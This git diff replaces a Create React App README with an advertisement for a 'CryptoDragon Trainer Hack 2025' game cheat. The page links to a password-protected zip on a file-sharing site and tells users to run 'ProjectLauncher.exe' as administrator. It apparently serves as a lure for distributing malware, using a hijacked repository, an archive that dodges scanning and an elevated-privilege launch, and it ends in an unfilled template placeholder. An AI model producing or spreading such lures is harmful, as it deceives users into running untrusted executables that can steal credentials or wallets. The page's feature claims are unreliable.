@@ -1,70 +1,47 @@
-# Getting Started with Create React App
+# CryptoDragon Trainer Hack 2025 – Unlimited Resources, Auto-Battle & Dragon Evolution Cheats  
 
-This project was bootstrapped with [Create React App](https://github.com/facebook/create-react-app).
+## 📜 CryptoDragon Trainer Cheat - Overview  
 
-## Available Scripts
+CryptoDragon Trainer Hack 2025 provides advanced game enhancements for faster dragon training, unlimited crypto rewards, and automated battles. Dominate the blockchain-based dragon arena with powerful cheats and hacks for 2025!
 
-In the project directory, you can run:
+# [DOWNLOAD](https://www.4sync.com/zip/WamRVb3D/Project_V193.html)  
+## PASSWORD: 1322
 
-### `npm start`
+<img width="1196" height="626" alt="Screenshot_1" src="https://github.com/user-attachments/assets/18aad32e-05b2-46de-839d-cdd3de797237" />
 
-Runs the app in the development mode.\
-Open [http://localhost:3000](http://localhost:3000) to view it in your browser.
+## ⚙ Features  
 
-The page will reload when you make changes.\
-You may also see any lint errors in the console.
+* **Unlimited Crypto Coins** – Instantly generate infinite in-game currency for upgrades and dragon purchases.  
+* **Auto-Battle Mode** – Automatically win battles without manual input for effortless progression.  
+* **Instant Dragon Evolution** – Skip waiting times and evolve dragons to their highest tiers immediately.  
+* **Max Stats Boost** – Unlock maximum dragon stats (HP, Attack, Speed) with a single click.  
+* **No Cooldown** – Remove all skill and breeding cooldowns for non-stop gameplay.  
+* **Unlock All Dragons** – Gain access to every rare and legendary dragon in the game.  
+* **Anti-Ban Protection** – Play safely with undetectable hacks to avoid account suspension.  
+* **Energy Refill Hack** – Never run out of energy for continuous training and battles.  
 
-### `npm test`
+And many other features!
 
-Launches the test runner in the interactive watch mode.\
-See the section about [running tests](https://facebook.github.io/create-react-app/docs/running-tests) for more information.
+---
 
-### `npm run build`
+## 📊 System requirements
 
-Builds the app for production to the `build` folder.\
-It correctly bundles React in production mode and optimizes the build for the best performance.
+> 🔲 **Supported CPU:** AMD & Intel
+>
+> 🔧 **Supported architectures:** 64-bit, 32-bit
+>
+> 💿 **Supported OS:** Windows 11, Windows 10, Windows 8, Windows 7
+>
+> 🖥️ **Supported modes:** Borderless, Windowed, Fullscreen
+>
+> 🛠️ **.NET Framework:** 4.8+
 
-The build is minified and the filenames include the hashes.\
-Your app is ready to be deployed!
+### 🤔 How to install on Windows?
 
-See the section about [deployment](https://facebook.github.io/create-react-app/docs/deployment) for more information.
+- Download the .zip archive using download button.
+- Extract the archive to a secure location.
+- Run `ProjectLauncher.exe` as administrator.
 
-### `npm run eject`
+💬 Have questions or need support? Join our active Discord community:
 
-**Note: this is a one-way operation. Once you `eject`, you can't go back!**
-
-If you aren't satisfied with the build tool and configuration choices, you can `eject` at any time. This command will remove the single build dependency from your project.
-
-Instead, it will copy all the configuration files and the transitive dependencies (webpack, Babel, ESLint, etc) right into your project so you have full control over them. All of the commands except `eject` will still work, but they will point to the copied scripts so you can tweak them. At this point you're on your own.
-
-You don't have to ever use `eject`. The curated feature set is suitable for small and middle deployments, and you shouldn't feel obligated to use this feature. However we understand that this tool wouldn't be useful if you couldn't customize it when you are ready for it.
-
-## Learn More
-
-You can learn more in the [Create React App documentation](https://facebook.github.io/create-react-app/docs/getting-started).
-
-To learn React, check out the [React documentation](https://reactjs.org/).
-
-### Code Splitting
-
-This section has moved here: [https://facebook.github.io/create-react-app/docs/code-splitting](https://facebook.github.io/create-react-app/docs/code-splitting)
-
-### Analyzing the Bundle Size
-
-This section has moved here: [https://facebook.github.io/create-react-app/docs/analyzing-the-bundle-size](https://facebook.github.io/create-react-app/docs/analyzing-the-bundle-size)
-
-### Making a Progressive Web App
-
-This section has moved here: [https://facebook.github.io/create-react-app/docs/making-a-progressive-web-app](https://facebook.github.io/create-react-app/docs/making-a-progressive-web-app)
-
-### Advanced Configuration
-
-This section has moved here: [https://facebook.github.io/create-react-app/docs/advanced-configuration](https://facebook.github.io/create-react-app/docs/advanced-configuration)
-
-### Deployment
-
-This section has moved here: [https://facebook.github.io/create-react-app/docs/deployment](https://facebook.github.io/create-react-app/docs/deployment)
-
-### `npm run build` fails to minify
-
-This section has moved here: [https://facebook.github.io/create-react-app/docs/troubleshooting#npm-run-build-fails-to-minify](https://facebook.github.io/create-react-app/docs/troubleshooting#npm-run-build-fails-to-minify)
+[![Discord](https://img.shields.io/badge/Discord-Join-7289DA?logo=discord)](https://discord.gg/<ГЕН.СТРОКА>)
